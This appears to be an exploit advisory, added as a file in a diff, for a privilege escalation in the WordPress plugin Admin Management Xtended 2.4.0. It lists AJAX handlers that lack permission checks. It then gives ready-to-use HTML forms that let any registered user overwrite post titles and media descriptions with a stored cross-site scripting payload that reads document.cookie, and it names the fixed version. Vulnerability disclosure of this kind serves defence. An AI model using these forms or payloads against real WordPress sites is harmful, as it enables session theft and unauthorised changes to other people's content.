@@ -1,0 +1,65 @@
+# Exploit Title: Admin Management Xtended 2.4.0 Privilege escalation
+# Date: 14-12-2015
+# Software Link: https://wordpress.org/plugins/admin-management-xtended/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+ 
+1. Description
+   
+Inside almost all wp_ajax function there is no privilege check.
+
+File: admin-management-xtended\general-functions.php
+
+add_action( 'wp_ajax_ame_toggle_visibility', 'ame_toggle_visibility' );
+add_action( 'wp_ajax_ame_set_date', 'ame_set_date' );
+add_action( 'wp_ajax_ame_save_title', 'ame_save_title' );
+add_action( 'wp_ajax_ame_save_slug', 'ame_save_slug' );
+add_action( 'wp_ajax_ame_slug_edit', 'ame_slug_edit' );
+add_action( 'wp_ajax_ame_save_order', 'ame_save_order' );
+add_action( 'wp_ajax_ame_toggle_orderoptions', 'ame_toggle_orderoptions' );
+add_action( 'wp_ajax_ame_toggle_showinvisposts', 'ame_toggle_showinvisposts' );
+add_action( 'wp_ajax_ame_get_pageorder', 'ame_get_pageorder' );
+add_action( 'wp_ajax_ame_ajax_save_categories', 'ame_ajax_save_categories' );
+add_action( 'wp_ajax_ame_ajax_get_categories', 'ame_ajax_get_categories' );
+add_action( 'wp_ajax_ame_ajax_set_commentstatus', 'ame_ajax_set_commentstatus' );
+add_action( 'wp_ajax_ame_ajax_save_tags', 'ame_ajax_save_tags' );
+add_action( 'wp_ajax_ame_ajax_toggle_imageset', 'ame_ajax_toggle_imageset' );
+add_action( 'wp_ajax_ame_ajax_save_mediadesc', 'ame_ajax_save_mediadesc' );
+add_action( 'wp_ajax_ame_author_edit', 'ame_author_edit' );
+add_action( 'wp_ajax_ame_save_author', 'ame_save_author' );
+add_action( 'wp_ajax_ame_toggle_excludestatus', 'ame_toggle_excludestatus' );
+add_action( 'wp_ajax_ame_toggle_sticky', 'ame_toggle_sticky' );
+
+http://security.szurek.pl/admin-management-xtended-240-privilege-escalation.html
+
+2. Proof of Concept
+
+Login as regular user (created using wp-login.php?action=register). Then you can change any post title:
+
+<form method="post" action="http://wordpress-url/wp-admin/admin-ajax.php?action=ame_save_title">
+Post id: <input type="text" name="category_id" value="1">
+Post title: <input type="text" name="new_title" value="<script>alert(document.cookie);</script>">
+<input type="submit" name="submit" value="Change">
+</form>
+
+XSS will be visible on post page:
+
+http://wordpress-url/?p=1
+
+Or change media excerpt:
+
+<form method="post" action="http://wordpress-url/wp-admin/admin-ajax.php?action=ame_ajax_save_mediadesc">
+Post id: <input type="text" name="postid" value="1">
+Excerpt: <input type="text" name="new_mediadesc" value="<script>alert(document.cookie);</script>">
+<input type="submit" name="submit" value="Change">
+</form>
+
+XSS will be visible for admin:
+
+http://wordpress-url/wp-admin/upload.php
+
+3. Solution:
+   
+Update to version 2.4.0.1
